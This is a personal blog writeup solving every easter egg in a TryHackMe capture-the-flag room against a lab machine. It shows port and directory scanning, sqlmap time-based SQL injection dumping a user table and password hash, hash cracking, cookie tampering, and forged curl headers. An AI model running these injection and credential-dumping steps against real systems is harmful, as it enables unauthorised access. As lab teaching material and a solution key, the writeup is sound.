---
tagline: CTFcollectionVol2
title: CTF collection Vol.2 Writeup
description: My Writeup for this TryHackMe Room
banner: /blog/tryhackmebanner.png/
banner_alt: Banner for TryHackMe challenges
date: '2024-02-6'
---

# 🚀 Opening Remarks

This is how I solved the [CTF collection Vol.2 Room](https://tryhackme.com/room/ctfcollectionvol2), **WARNING** This contains solutions to every Easter egg. Please refrain from simply copying the steps to obtain the flag; instead, aim to learn from them. Additionally, these solutions were written as I solved them, providing insight into my thought process at the time for a more realistic experience. Hope you enjoy! :D

## 📡 Nmap Scan

- I started with a basic NMAP scan like you would do for any machine

```bash:Terminal
❯ sudo nmap -sS -sV 10.10.152.207
Starting Nmap 7.94 ( https://nmap.org ) at 2024-02-04 20:57 EST
Nmap scan report for 10.10.152.207
Host is up (0.092s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.2.22 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

- Now that we know ports 80 and 22 are open, let's access them through a browser.

## 🌐 Accessing the website

- Upon accessing the website, we are greeted with an overwhelming mess.

![Image showing the website upon arrival](/blog/ctfcollectionvol2pics/website1.png 'Fig.1')

- Lets perform a directory search next!

## 🔍 Directory Search

- I chose to use Gobuster for this task, as I've found it to be the most effective tool for directory enumeration.


```bash:Terminal
❯ gobuster dir -u 10.10.152.207 -w /Users/vipin/tech/CTFs/wordlists/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.152.207
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /Users/vipin/tech/CTFs/wordlists/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index                (Status: 200) [Size: 94328]
/login                (Status: 301) [Size: 314] [--> http://10.10.152.207/login/]
/button               (Status: 200) [Size: 39148]
/static               (Status: 200) [Size: 253890]
/cat                  (Status: 200) [Size: 62048]
/small                (Status: 200) [Size: 689]
/who                  (Status: 200) [Size: 3847428]
/robots               (Status: 200) [Size: 430]
/iphone               (Status: 200) [Size: 19867]
/game1                (Status: 301) [Size: 314] [--> http://10.10.152.207/game1/]
/egg                  (Status: 200) [Size: 25557]
/dinner               (Status: 200) [Size: 1264533]
/ty                   (Status: 200) [Size: 198518]
/ready                (Status: 301) [Size: 314] [--> http://10.10.152.207/ready/]
/saw                  (Status: 200) [Size: 156274]
/game2                (Status: 301) [Size: 314] [--> http://10.10.152.207/game2/]
/wel                  (Status: 200) [Size: 155758]
/free_sub             (Status: 301) [Size: 317] [--> http://10.10.152.207/free_sub/]
/nicole               (Status: 200) [Size: 367650]
/server-status        (Status: 403) [Size: 294]
Progress: 220560 / 220561 (100.00%)
===============================================================
Finished
===============================================================
```

- Now that we have all this information, let's start the first easter egg!

## 🥚 Easter Egg 1

- Well to start let's check out a couple of the directories we found in *Gobuster*. The hint tells us to check out the "robots". Looking inside */robots* shows what seems to be a base64 string. If we put the base64 string over and over in Cyberchef with [this](https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false)From_Base64('A-Za-z0-9%2B/%3D',true,false)From_Base64('A-Za-z0-9%2B/%3D',true,false)From_Base64('A-Za-z0-9%2B/%3D',true,false)&input=VmxOQ2NFbEZTV2RUUTBKS1NVVlpaMWRUUW01SlIxVm5ZVk5DUTBsR1VXZFRVMEpGU1VWcloxcDVRbGRKUjJ0blVXbENOa2xGYTJkU2FVSnVTVWRqWjFSVFFqVkpSVWxuVkhsQ1NrbEZZMmRrZVVKdVNVWmpaMVY1UWtKSlNHOW5VMU5DUmtsSE9HZGFlVUpwU1VWTloxRnBRbkpKUld0blVsTkNXa2xIWTJkVWVVSlVTVVZKWjJORFFrcEpSVmxuWVhsQ2JrbEdZMmRSZVVKRFNVVTRaMU5UUWtoSlNHTm5VRkVsTTBRbE0wUT0) recipe it gives us this directory called *DesKel_secret_base* and when visiting that directory we get this...

![Image showing DesKel_secret_base](/blog/ctfcollectionvol2pics/DesKelsecretbase.png 'Fig.2')

- How amusing 😑, but lets check out the what seems to be a HEX string in */robots* and when [decoded from hex](https://gchq.github.io/CyberChef/#recipe=From_Hex('Auto')) it gives us the flag.

## 🐣 Easter Egg 2

- When looking at the hint, it says something about the base64 string that we decoded which means that that wasn't joke after all!

- Checking out inspect element has a surprise for us!?

![Image showing the flag in inspect element](/blog/ctfcollectionvol2pics/easteregg2.png 'Fig.3')

## 🍳 Easter Egg 3

- Looking at the hint tell us to use a directory buster with *common.txt* and thank god we did that in the beginning. Let's take a look at some of the directories

- Wait what the heck!? I just found the flag for Easter 19 in */small*, guess that another step done 🤷🏾‍♂️.

- And I did it again I may have found the flag for Easter 13 in */ready* 🤦🏾‍♂️.

![Image showing me accidentally getting the flag](/blog/ctfcollectionvol2pics/easteregg13.png 'Fig.4')

- Ironically I found the flags for 19 & 13, but not 3 🗿.

- Trying common.txt gives us the same results for the most part, but when looking at */login* source the flag is right there 🤦🏾‍♂️

![Image showing me finding the flag in the source](/blog/ctfcollectionvol2pics/easteregg3.png 'Fig.5')

- Guess I will continue tomorrow, because it is a school night 😴.

## 🐥 Easter Egg 4

- Its the morning, so let's continue finishing up the room.

- The hint says "time-based sqli" so I will be using SQLmap to solve it

``` bash:Terminal
❯ python3 sqlmap.py  --dbs -r /Users/vipin/tech/CTFs/TryHackMe/ctfcolvol2/postreq.txt -D THM_f0und_m3 --tables
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.8.2#stable}
|_ -| . [.]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org
```

- Now lets see what we get from it

```bash:Terminal

[16:49:12] [INFO] retrieved:
[16:49:17] [INFO] adjusting time delay to 1 second due to good response times
nothing_inside
[16:50:19] [INFO] retrieved: user
Database: THM_f0und_m3
[2 tables]
+----------------+
| user           |
| nothing_inside |
+----------------+

[16:50:35] [INFO] fetched data logged to text files under '/Users/vipin/.local/share/sqlmap/output/10.10.121.142'

```

- Ok, let look inside the *nothing_inside* table

```bash:Terminal

Database: THM_f0und_m3
Table: nothing_inside
[1 column]
+----------+-------------+
| Column   | Type        |
+----------+-------------+
| Easter_4 | varchar(30) |
+----------+-------------+

Database: THM_f0und_m3
Table: user
[2 columns]
+----------+-------------+
| Column   | Type        |
+----------+-------------+
| password | varchar(40) |
| username | varchar(30) |
+----------+-------------+

[16:57:10] [INFO] fetched data logged to text files under '/Users/vipin/.local/share/sqlmap/output/10.10.121.142'

[*] ending @ 16:57:10 /2024-02-05/
```

- Wow ok, now lets look in the *Easter_4* Column and make a query (the google cyber cert really paying off rn)

```bash:Terminal
❯ python3 sqlmap.py  --dbs -r /Users/vipin/tech/CTFs/TryHackMe/ctfcolvol2/postreq.txt -D THM_f0und_m3 -t nothing_inside -C Easter_4 --sql-query "SELECT Easter_4 FROM nothing_inside"
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.8.2#stable}
|_ -| . [']     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

```

- and there it is

![Image showing me finding the flag in the source](/blog/ctfcollectionvol2pics/easteregg3.png 'Fig.6')

## 🪺 Easter 5

- Remember the *user* table from the last easter, let check that out

```bash:Terminal

❯ python3 sqlmap.py  --dbs -r /Users/vipin/tech/CTFs/TryHackMe/ctfcolvol2/req2.txt -D THM_f0und_m3 -t user --columns
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.8.2#stable}
|_ -| . ["]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

```

- And we get this

```bash:Terminal

Database: THM_f0und_m3
Table: user
[2 columns]
+----------+-------------+
| Column   | Type        |
+----------+-------------+
| password | varchar(40) |
| username | varchar(30) |
+----------+-------------+

Database: THM_f0und_m3
Table: nothing_inside
[1 column]
+----------+-------------+
| Column   | Type        |
+----------+-------------+
| Easter_4 | varchar(30) |
+----------+-------------+

```

- Ok, now let's look inside *password & username*, to look at that columnn I used this command ```python3 sqlmap.py  --dbs -r /Users/vipin/tech/CTFs/TryHackMe/ctfcolvol2/req2.txt -D THM_f0und_m3 -t user -C username,password --sql-query 'SELECT username,password FROM user'``` and below is the output

```bash:Terminal

[*] DesKel, 05f3672ba34409136aa71b8d00070d1b
[*] Skidy, He is a nice guy, say hello for me

```

- Looks like we are PWD cracking 😁

![Image showing me cracking the password with hashes.com](/blog/ctfcollectionvol2pics/hashctf1.png 'Fig.7')

- **Tip: Before cracking with hashcat, always check [hashes.com](https://hashes.com/en/decrypt/hash) to see if they can crack it**

- Entering the password in the login page gives us the flag.

## 🐤 Easter 6

- Looking in Burpsuite on the homepage shows us the flag.

![Image showing me finding the flag in burpsuite](/blog/ctfcollectionvol2pics/easteregg6.png 'Fig.8')

- That was easy 🤷🏾‍♂️

## 🐔 Easter 7

- Looking at cookies on the homepage shows us a value of 0 for invites, changing it to 1 gives us the flag

![Image showing me getting the flag through cookies](/blog/ctfcollectionvol2pics/easteregg7.png 'Fig.9')

## 🐓 Easter 8

- To solve, I made a curl request with -A with the user agent said in the hint to the server's IP

```bash:Terminal
curl -A "Mozilla/5.0 (iPhone; CPU iPhone OS 13_1_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.1 Mobile/15E148 Safari/604.1" http://10.10.185.145/a
```

![Image showing me getting the flag through curl](/blog/ctfcollectionvol2pics/easteregg8.png 'Fig.10')

## 🍗 Easter 9

- When looking in */ready* source code, it shows the Easter 9 flag but it quickly changes to show the Easter 13 flag.

![Image showing me getting the flag using burpsuite to capture it](/blog/ctfcollectionvol2pics/easteregg9.png 'Fig.11')

- Using Burpsuite I captured the response quickly.

## 🥓 Easter 10

- Remember when we did that directory search, well it comes in handy. One of the directories I found was */free_sub*

- Now we need to use the THM website as a referrer like this ```curl --referer Referer_URL target_URL```

![Image showing me getting the flag through curl](/blog/ctfcollectionvol2pics/easteregg10.png 'Fig.12')

## 🍖 Easter 11

- When clicking through the dinner option on the salad one it tells us that it prefer's an egg so making a curl request like this

```bash:Terminal
❯ curl -X POST \
  http://10.10.185.145/ \
  --data 'dinner=egg&submit=submit'
  ```

- Gives us the flag :)

![Image showing me getting the flag through curl](/blog/ctfcollectionvol2pics/easteregg11.png 'Fig.13')

## 🥩 Easter 12

- Final flag of the night, gotta finish tommorrow.

- Looking the homepage source I look at jquery-9.1.2.js, because the hint says something about a fake JS

![Image showing me looking at js files to find the flag](/blog/ctfcollectionvol2pics/jquery-9.1.2.js.png 'Fig.14')

- When decoded [from hex](https://gchq.github.io/CyberChef/#recipe=From_Hex('None')) the flag is clear as day

![Image showing me getting the flag from cyberchef](/blog/ctfcollectionvol2pics/easteregg12.png 'Fig.14')

# 🍔 Easter 13

- Back in Easter 3 I accidentally found this flag in */ready*

![Image showing me accidentally getting the flag](/blog/ctfcollectionvol2pics/easteregg13.png 'Fig.15')

# 🌭 Easter 14

- In the homepage source, there is a base 64 string.

![Image showing me finding a BASE64 string](/blog/ctfcollectionvol2pics/easteregg14string.png 'Fig.16')

- Decoding it from base64 and rendering it into a picture gives us the flag.

![Image showing me finding the flag](/blog/ctfcollectionvol2pics/easteregg14.png 'Fig.17')

## 🌮 Easter 15

- This easter is a logical puzzle so be prepared

- I started by entering the full CAPS alphabet and the ful lowercase alphabet. With this information I made a table

```txt:Text Editor

99 100 101 102 103 104 51 52 53 54 55 56 57 58 126 127 128 129 130 131 136 137 138 139 141
A   B   C   D   E   F   G  H  I  J  K  L  M  N  O   P   Q   R   S   T   U   V    W  X   Z

89 90 91 92 93 94 95 41 42 43 75 76 77 78 79 80 81 10 11 12 13 14 15 16 17 18
a   b  c  d  e  f  g  h  i  j  k  l  m  n  o  p  q  r  s  t  u  v  w  x  y  z

```

- Now all we have to do is manually decode the hint to get the flag

![Image showing me solving the puzzle](/blog/ctfcollectionvol2pics/easteregg15.png 'Fig.18')

- And Voila!

## 🌯 Easter 16

- Now we are playing */game2* so let press them at the same time.

- When looking at burp, it seems like there is a value ```button2=button2&submit=submit``` that gets posted when you click the button, what if we made a curl request to send those values

```bash:Terminal

❯ curl -X POST \
  -d 'button1=button1&submit=submit' \
  -d 'button2=button2&submit=submit' \
  -d 'button3=button3&submit=submit' \
  http://10.10.224.131/game2/

<html>
        <head>
                <title>Game 2</title>
                <h1>Press the button simultaneously</h1>
        </head>
 <body>

 <form method="POST">
  <input type="hidden" name="button1" value="button1">
  <button name="submit" value="submit">Button 1</button>
 </form>

 <form method="POST">
                <input type="hidden" name="button2" value="button2">
                <button name="submit" value="submit">Button 2</button>
        </form>

 <form method="POST">
                <input type="hidden" name="button3" value="button3">
                <button name="submit" value="submit">Button 3</button>
        </form>
 Just temper the code and you are good to go. Easter 16: THM{REDACTED} </body>
</html>

```

## 🥙 Easter 17

- Looking in the page source we find this script

![Image showing me finding some script](/blog/ctfcollectionvol2pics/pagesource17.png 'Fig.19')

- The hint says to decode from bin -> dec -> hex -> ascii, I don't feel like saying anything else as this is pretty straight forward

## 🥗 Easter 18

- Another POST request we need to make, once again I will be utilizing cURL for this

```bash:Terminal
╰─ curl -X POST \
  -H 'egg: Yes' \
  http://10.10.166.61/
```

- Above is the command I ran and it instantly gave me the flag!

![Image showing me getting the flag](/blog/ctfcollectionvol2pics/easteregg18.png 'Fig.20')

## 🥪 Easter 19

- Back in Easter 3, I found the flag accidentally in */small*

## 🗿 Easter 20

- The final stretch!

- Another cURL request to */login*, the command I used is below.

```curl -X POST -d "username=DesKel&password=heIsDumb&submit=submit" http://10.10.166.61/```

![Image showing me getting the flag](/blog/ctfcollectionvol2pics/easteregg20.png 'Fig.21')


# 💭 Final Thoughts

- Very fun room, I enjoyed it a lot. I learned some new things such as using Burp and other tools. Personally the SQLmap stuff was a little tricky, but overall it was a great room!

